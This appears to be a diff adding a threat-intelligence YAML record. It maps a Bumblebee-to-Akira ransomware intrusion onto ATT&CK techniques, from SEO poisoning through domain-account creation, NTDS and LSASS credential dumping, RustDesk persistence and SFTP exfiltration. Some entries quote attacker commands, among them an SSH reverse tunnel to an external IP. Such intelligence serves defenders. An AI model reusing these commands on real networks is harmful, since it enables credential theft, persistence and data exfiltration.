@@ -1,0 +1,107 @@
+title: 'From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira'
+source: https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/
+date_published: '2025-11-04'
+date_ingested: '2026-03-21'
+threat_actors:
+- Bumblebee Operator
+- Akira Ransomware Affiliate
+platforms:
+- Windows
+techniques:
+- id: T1189
+  name: Drive-by Compromise
+  description: User searching Bing for ManageEngine OpManager was redirected via SEO poisoning to opmanager[.]pro, which served
+    a trojanized MSI installer.
+  priority: high
+- id: T1204.002
+  name: 'User Execution: Malicious File'
+  description: Victim executed ManageEngine-OpManager.msi, a trojanized installer that installed legitimate software while
+    side-loading Bumblebee via msimg32.dll.
+  priority: high
+- id: T1574.002
+  name: 'Hijack Execution Flow: DLL Side-Loading'
+  description: Bumblebee loaded as msimg32.dll via consent.exe after the trojanized MSI installer was executed, abusing legitimate
+    DLL search order.
+  priority: high
+- id: T1568.002
+  name: 'Dynamic Resolution: Domain Generation Algorithms'
+  description: Bumblebee used DGA-generated .org domains (e.g., ev2sirbd269o5j[.]org) for C2 communication, with multiple
+    DNS queries to matching domains occurring within seconds of each other.
+  priority: high
+- id: T1136.002
+  name: 'Create Account: Domain Account'
+  description: Threat actor created two domain accounts, backup_DA and backup_EA, to establish persistent privileged access
+    within Active Directory.
+  priority: high
+- id: T1098
+  name: Account Manipulation
+  description: backup_EA account was immediately added to the Enterprise Administrators group using net group commands after
+    creation, granting domain-wide administrative privileges.
+  priority: high
+- id: T1003.003
+  name: 'OS Credential Dumping: NTDS'
+  description: Threat actor used wbadmin.exe to create a backup of ntds.dit, SYSTEM, and SECURITY hive files to \\127.0.0.1\C$\ProgramData\
+    on a domain controller.
+  priority: high
+- id: T1555
+  name: Credentials from Password Stores
+  description: Threat actor queried the Veeam PostgreSQL database using psql.exe to extract stored backup credentials including
+    usernames, passwords, and change timestamps.
+  priority: high
+- id: T1047
+  name: Windows Management Instrumentation
+  description: WMI used alongside remote services to perform LSASS memory dumping on multiple workstations via rundll32.exe
+    with comsvcs.dll.
+  priority: medium
+- id: T1219
+  name: Remote Access Software
+  description: RustDesk remote access tool installed on multiple hosts for persistent re-entry, used two days later to return
+    and encrypt child domain systems.
+  priority: high
+- id: T1572
+  name: Protocol Tunneling
+  description: Threat actor established an SSH reverse tunnel (ssh root@193.242.184[.]150 -R *:10400 -p22) to proxy activity
+    through an external server and obfuscate origin.
+  priority: medium
+- id: T1018
+  name: Remote System Discovery
+  description: 'nltest /dclist: used to enumerate domain controllers; SoftPerfect Network Scanner renamed as n.exe deployed
+    to map internal network hosts.'
+  priority: medium
+- id: T1033
+  name: System Owner/User Discovery
+  description: whoami /groups executed to enumerate current user context and group memberships following initial access via
+    AdaptixC2 beacon.
+  priority: low
+- id: T1069.002
+  name: 'Permission Groups Discovery: Domain Groups'
+  description: net group 'domain admins' /dom and net group 'enterprise admins' /dom used to identify privileged group membership
+    during post-exploitation reconnaissance.
+  priority: medium
+- id: T1135
+  name: Network Share Discovery
+  description: Invoke-ShareFinder deployed during second intrusion phase (child domain) to enumerate accessible network shares
+    prior to ransomware deployment.
+  priority: medium
+- id: T1036.003
+  name: 'Masquerading: Rename System Utilities'
+  description: SoftPerfect Network Scanner was renamed to n.exe to disguise the scanning tool and evade detection based on
+    known tool names.
+  priority: medium
+- id: T1048
+  name: Exfiltration Over Alternative Protocol
+  description: FileZilla installed on a file server and used to exfiltrate data via SFTP to external server 185.174.100[.]203
+    prior to ransomware deployment.
+  priority: high
+- id: T1486
+  name: Data Encrypted for Impact
+  description: Akira ransomware (locker.exe) deployed and executed with command-line options to encrypt local drives, remote
+    network shares, and directories on remote hosts across both root and child domains.
+  priority: critical
+iocs: []
+raw_summary: In July 2025, a threat actor used SEO poisoning to deliver a trojanized ManageEngine OpManager MSI installer
+  that loaded Bumblebee malware, which then deployed an AdaptixC2 beacon for post-exploitation. The attacker escalated within
+  44 hours from initial access to Akira ransomware deployment by creating privileged domain accounts, dumping NTDS.dit via
+  wbadmin, installing RustDesk for persistence, and exfiltrating data via FileZilla SFTP. Two days after the first ransomware
+  wave, the actor returned via RustDesk and encrypted a child domain, with a similar campaign observed by Swisscom B2B CSIRT
+  achieving ransomware deployment in only nine hours.
